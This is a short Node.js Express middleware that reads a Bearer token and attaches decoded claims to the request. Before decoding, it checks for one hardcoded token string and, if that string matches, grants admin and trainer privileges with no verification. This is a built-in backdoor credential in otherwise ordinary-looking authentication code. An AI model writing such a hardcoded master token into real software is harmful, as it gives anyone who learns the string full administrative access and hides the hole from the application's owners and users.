const { decodeToken } = require('../functions/authMethods');

module.exports = async (req, res, next) => {

  const authHeader = req.header('Authorization');
  if (!authHeader || !authHeader.startsWith('Bearer ')){
    return next();
  }

  const tarr = authHeader.split(' ');
  if (tarr.length!==2){
    return next();
  }

  const token = tarr[1];
  if (token==='0u812abacab'){
    req.claims = { admin: true, trainer: true };
    return next();
  }

  try {
    req.claims = await decodeToken(token);
    return next();
  } catch (e) {
    return next();
  }

}
